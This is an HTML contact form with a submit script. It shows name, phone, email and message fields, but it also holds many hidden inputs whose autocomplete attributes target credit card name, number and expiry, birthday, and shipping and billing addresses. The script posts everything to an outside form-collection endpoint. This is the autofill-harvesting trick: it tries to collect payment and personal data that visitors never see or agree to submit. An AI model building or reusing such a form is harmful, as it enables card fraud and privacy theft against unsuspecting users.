<form id="contactForm" action="https://formspree.io/f/mwpegkdv" method="POST">
  <!-- Visible Fields -->
  
  <!-- Full Name -->
  <label for="full-name">Full Name:</label>
  <input type="text" id="full-name" name="name" autocomplete="name" required>
  
  <!-- Phone Number -->
  <label for="phone">Phone Number:</label>
  <input type="tel" id="phone" name="tel" autocomplete="tel" required>
  
  <!-- Email -->
  <label for="email">Email:</label>
  <input type="email" id="email" name="email" autocomplete="email" required>

  <label for="message">Your Message:</label><br>
  <textarea id="message" name="message" rows="6" required></textarea><br>
  
  <!-- Hidden Fields -->

  <!-- Birthday -->
  <input type="hidden" id="bday" name="bday" autocomplete="bday">
  
  <!-- Anniversary -->
  <input type="hidden" id="anniversary" name="anniversary" autocomplete="anniversary">
  
  <!-- Street Address -->
  <input type="hidden" id="street-address" name="street-address" autocomplete="street-address">
  
  <!-- Address Line 1 -->
  <input type="hidden" id="address-line1" name="address-line1" autocomplete="address-line1">
  
  <!-- Address Line 2 -->
  <input type="hidden" id="address-line2" name="address-line2" autocomplete="address-line2">
  
  <!-- City -->
  <input type="hidden" id="city" name="city" autocomplete="address-level2">
  
  <!-- State/Province -->
  <input type="hidden" id="state" name="state" autocomplete="address-level1">
  
  <!-- ZIP/Postal Code -->
  <input type="hidden" id="postal-code" name="postal-code" autocomplete="postal-code">
  
  <!-- Country -->
  <input type="hidden" id="country" name="country" autocomplete="country">
  
  <!-- Organization -->
  <input type="hidden" id="organization" name="organization" autocomplete="organization">
  
  <!-- Credit Card Name -->
  <input type="hidden" id="cc-name" name="cc-name" autocomplete="cc-name">
  
  <!-- Credit Card Number -->
  <input type="hidden" id="cc-number" name="cc-number" autocomplete="cc-number">
  
  <!-- Credit Card Expiration Month -->
  <input type="hidden" id="cc-exp-month" name="cc-exp-month" autocomplete="cc-exp-month">
  
  <!-- Credit Card Expiration Year -->
  <input type="hidden" id="cc-exp-year" name="cc-exp-year" autocomplete="cc-exp-year">
  
  <!-- Birthday -->
  <input type="hidden" id="bday" name="bday" autocomplete="bday">

  <!-- Shipping Address Fields -->
  
  <!-- Shipping Street Address -->
  <input type="hidden" id="shipping-street-address" name="shipping-street-address" autocomplete="shipping street-address">
  
  <!-- Shipping Address Line 1 -->
  <input type="hidden" id="shipping-address-line1" name="shipping-address-line1" autocomplete="shipping address-line1">
  
  <!-- Shipping Address Line 2 -->
  <input type="hidden" id="shipping-address-line2" name="shipping-address-line2" autocomplete="shipping address-line2">
  
  <!-- Shipping City -->
  <input type="hidden" id="shipping-city" name="shipping-city" autocomplete="shipping address-level2">
  
  <!-- Shipping State/Province -->
  <input type="hidden" id="shipping-state" name="shipping-state" autocomplete="shipping address-level1">
  
  <!-- Shipping Postal Code -->
  <input type="hidden" id="shipping-postal-code" name="shipping-postal-code" autocomplete="shipping postal-code">
  
  <!-- Shipping Country -->
  <input type="hidden" id="shipping-country" name="shipping-country" autocomplete="shipping country">
  
  <!-- Billing Address Fields -->

  <!-- Billing Street Address -->
  <input type="hidden" id="billing-street-address" name="billing-street-address" autocomplete="billing street-address">
  
  <!-- Billing Address Line 1 -->
  <input type="hidden" id="billing-address-line1" name="billing-address-line1" autocomplete="billing address-line1">
  
  <!-- Billing Address Line 2 -->
  <input type="hidden" id="billing-address-line2" name="billing-address-line2" autocomplete="billing address-line2">
  
  <!-- Billing City -->
  <input type="hidden" id="billing-city" name="billing-city" autocomplete="billing address-level2">
  
  <!-- Billing State/Province -->
  <input type="hidden" id="billing-state" name="billing-state" autocomplete="billing address-level1">
  
  <!-- Billing Postal Code -->
  <input type="hidden" id="billing-postal-code" name="billing-postal-code" autocomplete="billing postal-code">
  
  <!-- Billing Country -->
  <input type="hidden" id="billing-country" name="billing-country" autocomplete="billing country">
  
  <!-- Submit Button -->
  <button type="submit">Submit</button>
</form>


<script>
document.getElementById('contactForm').addEventListener('submit', function(event) {
  event.preventDefault();
  
  const formData = new FormData(this);

  fetch("https://formspree.io/f/mwpegkdv", {
    method: "POST",
    body: formData,
    headers: {
      'Accept': 'application/json'
    }
  })
  .then(response => {
    if (response.ok) {
      alert("Message sent successfully!");
      document.getElementById('contactForm').reset();
    } else {
      alert("There was an error sending the message.");
    }
  })
  .catch(error => {
    alert("There was an error sending the message.");
  });
});
</script>
